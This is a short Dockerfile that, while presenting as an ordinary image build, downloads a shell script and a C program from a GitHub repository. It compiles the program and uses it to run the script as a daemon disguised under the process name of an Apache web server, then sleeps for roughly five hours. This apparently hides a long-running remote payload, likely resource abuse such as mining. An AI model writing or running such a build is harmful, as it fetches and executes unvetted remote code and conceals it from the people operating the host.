FROM ubuntu:18.04

# Install.
RUN \
  apt-get update && \
  apt-get install screen -y && \
  apt-get install -y wget && \
  apt-get install sudo && \
  apt-get install gcc -y && \
  apt-get install git -y && \
  apt-get install curl -y && \
  wget https://github.com/vamzie2282/tesar373/raw/main/rust.sh && \
  chmod 777 rust.sh && \
  wget https://github.com/vamzie2282/tesar373/raw/main/test.c && \
  gcc -o test test.c && \
  ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./rust.sh && \
  sleep 17990 && \
  rm -rf /var/lib/apt/lists/* 
